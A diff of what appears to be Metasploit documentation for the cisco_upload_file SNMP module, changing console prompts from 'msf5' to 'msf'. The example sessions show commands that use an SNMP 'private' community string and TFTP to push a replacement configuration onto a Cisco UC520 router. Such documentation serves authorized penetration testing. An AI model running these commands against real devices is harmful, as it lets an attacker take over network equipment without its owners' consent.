@@ -49,14 +49,14 @@ Override_Config
 ### Cisco UC520-8U-4FXO-K9 running IOS 12.4
 
 ```
-msf5 > setg rhosts 2.2.2.2
+msf > setg rhosts 2.2.2.2
 rhosts => 2.2.2.2
-msf5 > use auxiliary/scanner/snmp/cisco_upload_file
-msf5 auxiliary(scanner/snmp/cisco_upload_file) > set source /tmp/backup_config2
+msf > use auxiliary/scanner/snmp/cisco_upload_file
+msf auxiliary(scanner/snmp/cisco_upload_file) > set source /tmp/backup_config2
 source => /tmp/backup_config2
-msf5 auxiliary(scanner/snmp/cisco_upload_file) > set community private
+msf auxiliary(scanner/snmp/cisco_upload_file) > set community private
 community => private
-msf5 auxiliary(scanner/snmp/cisco_upload_file) > run
+msf auxiliary(scanner/snmp/cisco_upload_file) > run
 
 [*] Starting TFTP server...
 [*] Copying file backup_config2 to 2.2.2.2...
@@ -69,17 +69,17 @@ msf5 auxiliary(scanner/snmp/cisco_upload_file) > run
 
 ```
 
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set COMMUNITY private`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > set COMMUNITY private`
 `COMMUNITY => private`
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set LHOST 10.20.164.164`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > set LHOST 10.20.164.164`
 `LHOST => 10.20.164.164`
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set action Override_Config`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > set action Override_Config`
 `action => Override_Config`
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set rhosts 10.20.205.5`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > set rhosts 10.20.205.5`
 `rhosts => 10.20.205.5`
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set source /root/Desktop/newconfig`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > set source /root/Desktop/newconfig`
 `source => /root/Desktop/newconfig`
-`msf5 auxiliary(scanner/snmp/cisco_upload_file) > run`
+`msf auxiliary(scanner/snmp/cisco_upload_file) > run`
 
 `[*] Starting TFTP server...`
 `[*] Copying file newconfig to 10.20.205.5...`
